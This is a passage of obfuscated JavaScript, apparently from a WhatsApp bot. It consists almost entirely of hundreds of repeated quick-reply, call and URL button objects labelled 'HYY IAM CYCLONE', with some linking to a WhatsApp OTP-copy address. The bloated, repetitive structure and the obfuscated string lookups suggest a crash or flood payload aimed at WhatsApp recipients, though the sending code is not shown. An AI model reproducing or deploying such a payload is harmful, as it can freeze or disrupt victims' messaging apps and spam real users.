b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}